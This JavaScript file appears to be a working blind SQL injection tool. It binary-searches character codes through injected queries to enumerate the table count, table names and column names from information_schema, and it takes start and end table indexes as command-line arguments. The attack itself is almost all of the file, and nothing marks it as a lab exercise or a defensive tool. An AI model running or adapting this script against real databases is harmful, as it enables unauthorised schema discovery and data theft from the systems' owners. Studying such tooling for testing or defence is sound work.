import {
  confirmValue, binarySearch
} from './utility_functions.js'

const tableMaxLength = async () => {
  const sqlQuery = 'select max(char_length(table_name)) from information_schema.tables';
  let maxValue = await binarySearch(10, 64, sqlQuery)
  return confirmValue(maxValue, sqlQuery)
}

const countOfTables = async () => {
  const sqlQuery = 'select count(distinct(table_name)) from information_schema.tables'; 
  let tablesCount = await binarySearch(10, 1000, sqlQuery) 
  return confirmValue(tablesCount, sqlQuery)
}

const getTableNameLength = async (index, maxLength) => {
  const sqlQuery = `select char_length(table_name) from (select distinct(table_name) from information_schema.tables order by table_name limit 1 offset ${index})`;
  const length = await binarySearch(1, maxLength, sqlQuery)
  return confirmValue(length, sqlQuery);
}

const getASCIICode = async (position, index) => {
  const sqlQuery = `select ascii(substring(table_name,${position},1)) from (select distinct(table_name) from information_schema.tables order by table_name limit 1 offset ${index})`;
  let asciiValue = await binarySearch(32, 122, sqlQuery) 
  return confirmValue(asciiValue, sqlQuery)
}

const getTableName = async (index, maxLength) => {
  const tableLength = await getTableNameLength(index, maxLength)
  console.log('table name length: ', tableLength)

  let tableName = ''
  for(let i = 1; i <= Number(tableLength); i++) {
    let ascii = await getASCIICode(i, index)
    tableName = tableName.concat(String.fromCharCode(ascii))
    console.log(tableName)
  }
  return tableName
}

const getNumberOfColumns = async tableName => {
  const sqlQuery = `select count(distinct(column_name)) from information_schema.columns where table_name = '${tableName}'`;
  let columnsCount = await binarySearch(1, 4098, sqlQuery) 
  return confirmValue(columnsCount, sqlQuery)
}

const getColumnLength = async (index, tableName) => {
  const sqlQuery = `select char_length(column_name) from (select distinct(column_name) from information_schema.columns where table_name = '${tableName}' order by column_name limit 1 offset ${index})`;
  const length = await binarySearch(1, 128, sqlQuery)
  return confirmValue(length, sqlQuery);
}
/*
const getASCIICode = async (position, index) => {

  const sqlQuery = `select ascii(substring(table_name,${position},1)) from (select distinct(table_name) from information_schema.tables order by table_name limit 1 offset ${index})`;
  
  let asciiValue = await binarySearch(32, 122, sqlQuery) 
  return confirmValue(asciiValue, sqlQuery)
}
*/

const getASCIIForColumn = async (position, index, tableName) => {
  const sqlQuery = `select ascii(substring(column_name,${position},1)) from (select distinct(column_name) from information_schema.columns where table_name = '${tableName}' order by column_name limit 1 offset ${index})`;
  let asciiValue = await binarySearch(32, 122, sqlQuery)
  return confirmValue(asciiValue, sqlQuery)
}

const getColumnName = async (columnIndex, tableName) => {
  let columnsCount = await getNumberOfColumns(tableName)
  let columnLength = await getColumnLength(columnIndex, tableName)

  let columnName = ''
  for(let i = 1; i <= Number(columnLength); i++) {
    let ascii = await getASCIIForColumn(i, columnIndex, tableName)
    columnName = columnName.concat(String.fromCharCode(ascii))
  }
  return columnName
}

const validateInput = (start, end) => {
  try {
    start = Number(start)
    end = Number(end)
  } catch(e) {
    console.log(`Cannot typecast to Number: ${e.message}`)
    process.exit(1)
  }

  if(typeof start === 'number' && typeof end === 'number') {
    if(start >= 0 && start <= 121 && end >= 1 && end <= 122 && (start < end)){
      return true
    }
  } 
  return false
}

(async function () {
  let start = process.argv[2]
  let end = process.argv[3]

  if(!validateInput(start, end)) {
    console.log('Please enter valid values for start and end')
    console.log('Valid range for start: 0-121')
    console.log('Valid range for end: 1-122')
    console.log('start must be lesser than end for the script to run')
    process.exit(1)
  }

  let maxLength = await tableMaxLength()
  console.log(`Max length from table names: ${maxLength}`)

  let tablesCount = await countOfTables()
  console.log(`table count: ${tablesCount}`)

  const tableNames = {}

  for(let i = start; i < end; i++) {
    let tableName = await getTableName(i, maxLength)
    let columnsCount = await getNumberOfColumns(tableName)

    let columns = []
    console.log(`Columns found in ${tableName}`)
    for(let j = 0; j < Number(columnsCount); j++) {
      let columnName = await getColumnName(j, tableName)
      console.log(columnName)
    }
    console.log('-----------')
  }

})()
/*
(async function(){
  //let l = await tableNameLength(1, 33);
  let tableName = 'ACCESS_LOG'
  let columnsCount = await getNumberOfColumns(tableName)

  let columns = []
  for(let j = 0; j < Number(columnsCount); j++) {
    let columnName = await getColumnName(j, tableName)
    console.log(columnName)
  }
})()
*/
